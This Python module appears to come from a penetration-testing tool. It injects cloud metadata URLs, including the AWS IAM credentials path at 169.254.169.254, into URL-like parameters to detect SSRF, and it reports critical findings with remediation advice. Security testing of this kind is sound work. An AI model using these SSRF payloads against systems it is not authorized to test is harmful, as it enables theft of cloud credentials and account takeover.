"""Cloud metadata service detection (via SSRF or direct access)."""

from __future__ import annotations

from typing import Any

from pencheff.config import Severity
from pencheff.core.findings import Evidence, Finding
from pencheff.core.http_client import PencheffHTTPClient
from pencheff.core.session import PentestSession
from pencheff.modules.base import BaseTestModule

METADATA_ENDPOINTS = {
    "aws": [
        ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "hostname"]),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
    ],
    "gcp": [
        ("http://metadata.google.internal/computeMetadata/v1/?recursive=true", ["project", "instance"]),
    ],
    "azure": [
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute", "vmId"]),
    ],
}


class CloudMetadataModule(BaseTestModule):
    name = "cloud_metadata"
    category = "cloud"
    owasp_categories = ["A10", "A05"]
    description = "Cloud metadata service access detection"

    def get_techniques(self) -> list[str]:
        return ["direct_access", "ssrf_based"]

    async def run(
        self,
        session: PentestSession,
        http: PencheffHTTPClient,
        targets: list[str] | None = None,
        config: dict[str, Any] | None = None,
    ) -> list[Finding]:
        findings = []
        config = config or {}
        provider = config.get("provider", "all")

        providers = METADATA_ENDPOINTS if provider == "all" else {
            provider: METADATA_ENDPOINTS.get(provider, [])
        }

        # Check for SSRF-vulnerable parameters that could reach metadata
        ssrf_params = []
        for ep in session.discovered.endpoints:
            for param in ep.get("params", []):
                if param.lower() in ("url", "uri", "src", "dest", "redirect", "fetch", "proxy", "load"):
                    ssrf_params.append((ep, param))

        for cloud, endpoints in providers.items():
            for meta_url, markers in endpoints:
                # Test via SSRF-vulnerable parameters
                for ep, param in ssrf_params[:5]:
                    try:
                        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
                        parsed = urlparse(ep["url"])
                        qs = parse_qs(parsed.query, keep_blank_values=True)
                        qs[param] = [meta_url]
                        test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

                        headers = {}
                        if cloud == "gcp":
                            headers["Metadata-Flavor"] = "Google"

                        resp = await http.get(test_url, headers=headers, module="cloud_metadata")
                        body = resp.text

                        if resp.status_code == 200 and any(m.lower() in body.lower() for m in markers):
                            findings.append(Finding(
                                title=f"Cloud Metadata Accessible via SSRF ({cloud.upper()})",
                                severity=Severity.CRITICAL,
                                category="cloud",
                                owasp_category="A10",
                                description=f"Cloud metadata service ({cloud.upper()}) is accessible via SSRF "
                                            f"through parameter '{param}'. This can expose IAM credentials "
                                            "and lead to full cloud account compromise.",
                                remediation=f"Block access to metadata endpoints (169.254.169.254). "
                                            f"Use IMDSv2 (AWS) with hop limit. Implement SSRF protections.",
                                endpoint=ep["url"],
                                parameter=param,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                                cvss_score=10.0,
                                cwe_id="CWE-918",
                                evidence=[Evidence(
                                    request_method="GET",
                                    request_url=test_url,
                                    response_status=resp.status_code,
                                    response_body_snippet=body[:300],
                                    description=f"Metadata from {cloud.upper()} retrieved via SSRF",
                                )],
                            ))
                    except Exception:
                        continue

        return findings
